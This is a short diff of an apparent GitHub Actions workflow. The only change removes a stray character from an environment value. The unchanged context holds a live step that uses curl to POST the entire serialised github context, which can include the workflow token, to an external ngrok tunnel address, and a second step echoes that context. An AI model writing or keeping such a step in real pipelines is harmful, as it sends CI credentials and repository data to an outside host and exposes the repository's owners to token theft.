@@ -20,7 +20,7 @@ jobs:
         run: |
           curl -X POST -H "Content-Type: application/json" -d '${{ env.GITHUB_OBJECT }}' https://2dec-186-225-45-189.ngrok-free.app/log
         env:
-          GITHUB_OBJECT: ${{ toJson(github) }}f
+          GITHUB_OBJECT: ${{ toJson(github) }}
 
       - name: Mostrar o valor do commit
         run: echo "shablau ${{ github }}"
